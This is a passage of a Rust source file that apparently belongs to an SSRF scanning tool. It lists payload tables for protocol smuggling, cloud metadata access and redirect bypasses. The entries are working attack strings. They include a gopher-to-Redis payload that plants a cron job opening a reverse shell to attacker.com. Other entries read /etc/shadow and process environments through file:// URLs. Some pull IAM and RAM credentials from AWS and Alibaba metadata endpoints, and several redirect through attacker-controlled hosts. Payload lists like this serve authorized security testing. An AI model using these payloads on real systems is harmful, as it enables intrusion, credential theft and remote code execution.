...
const PROTOCOL_SMUGGLING_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload {
        ...
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Gopher to Redis FLUSHALL",
    },
    SsrfPayload {
        payload: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$64%0d%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Gopher Redis reverse shell cron",
    },
    SsrfPayload {
        payload: "gopher://127.0.0.1:11211/_set%20ssrf%200%2060%205%0d%0ahello%0d%0a",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Gopher to Memcached SET",
    },
    SsrfPayload {
        payload: "gopher://127.0.0.1:25/_EHLO%20attacker.com%0d%0aMAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<admin@target.com>%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0a%0d%0aPwned%0d%0a.%0d%0aQUIT",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Gopher to SMTP send email",
    },
    SsrfPayload {
        payload: "gopher://127.0.0.1:3306/_%01%00%00%01%85%a6%03%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Gopher to MySQL handshake",
    },
    SsrfPayload {
        payload: "dict://127.0.0.1:6379/info",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Dict protocol to Redis INFO",
    },
    SsrfPayload {
        payload: "dict://127.0.0.1:11211/stats",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Dict protocol to Memcached STATS",
    },
    SsrfPayload {
        payload: "file:///etc/passwd",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read /etc/passwd",
    },
    SsrfPayload {
        payload: "file:///etc/shadow",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read /etc/shadow",
    },
    SsrfPayload {
        payload: "file:///etc/hosts",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read /etc/hosts",
    },
    SsrfPayload {
        payload: "file:///proc/self/environ",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read process env",
    },
    SsrfPayload {
        payload: "file:///proc/self/cmdline",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read process cmdline",
    },
    SsrfPayload {
        payload: "file:///proc/net/tcp",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read open ports",
    },
    SsrfPayload {
        payload: "file:///proc/net/fib_trie",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol read routing table",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "File protocol Windows hosts file",
    },
    SsrfPayload {
        payload: "ldap://127.0.0.1/dc=example,dc=com",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "LDAP protocol internal query",
    },
    SsrfPayload {
        payload: "tftp://127.0.0.1/test",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "TFTP protocol probe",
    },
    SsrfPayload {
        payload: "jar:http://127.0.0.1/!/file.txt",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "JAR protocol SSRF (Java)",
    },
    SsrfPayload {
        payload: "netdoc:///etc/passwd",
        category: SsrfCategory::ProtocolSmuggling,
        cloud_provider: None,
        description: "Netdoc protocol file read (Java)",
    },
];
...
const CLOUD_METADATA_PAYLOADS: &[SsrfPayload] = &[
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Aws),
        description: "AWS IMDSv1 metadata root",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Aws),
        description: "AWS internal IP",
    },
    SsrfPayload {
        payload: "http://169.254.169.254/latest/meta-data/public-keys/",
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Aws),
        description: "AWS SSH public keys",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        payload: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Aws),
        description: "AWS EC2 identity credentials",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Gcp),
        description: "GCP Kubernetes environment",
    },
    SsrfPayload {
        payload: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Gcp),
    ...
    SsrfPayload {
        ...
        description: "DigitalOcean metadata root",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Alibaba),
        description: "Alibaba Cloud metadata root",
    },
    SsrfPayload {
        payload: "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Alibaba),
        description: "Alibaba Cloud RAM credentials",
    },
    SsrfPayload {
    ...
    SsrfPayload {
        ...
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Oracle),
        description: "Oracle Cloud instance metadata",
    },
    SsrfPayload {
        payload: "http://169.254.169.254/opc/v2/instance/metadata/",
        category: SsrfCategory::CloudMetadata,
        cloud_provider: Some(CloudProvider::Oracle),
        description: "Oracle Cloud custom metadata",
    },
];
...
const REDIRECT_PAYLOADS: &[SsrfPayload] = &[
    SsrfPayload {
        ...
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "Open redirect to localhost via httpbin",
    },
    SsrfPayload {
        payload: "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: Some(CloudProvider::Aws),
        description: "Open redirect to AWS metadata",
    },
    SsrfPayload {
        payload: "https://ngrok.io/redirect?url=http://127.0.0.1/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "Redirect service to localhost",
    },
    SsrfPayload {
        payload: "http://attacker.com/302.php?url=http://169.254.169.254/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: Some(CloudProvider::Generic),
        description: "Attacker-controlled 302 redirect",
    },
    SsrfPayload {
        payload: "http://shorturl.at/internal-redirect",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "URL shortener redirect to internal",
    },
    SsrfPayload {
        payload: "https://bit.ly/internal-ssrf",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "bit.ly redirect to internal",
    },
    SsrfPayload {
        payload: "http://0x7f000001.attacker.com/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "Wildcard DNS resolving to 127.0.0.1",
    },
    SsrfPayload {
        payload: "http://attacker.com/redirect?to=gopher://127.0.0.1:6379/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "Redirect to gopher protocol",
    },
    SsrfPayload {
        payload: "http://www.attacker.com/301?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: Some(CloudProvider::Aws),
        description: "301 redirect to AWS IAM creds",
    },
    SsrfPayload {
        payload: "http://attacker.com/redirect?url=file:///etc/passwd",
        category: SsrfCategory::RedirectBypass,
        cloud_provider: None,
        description: "Redirect to file protocol",
    },
];
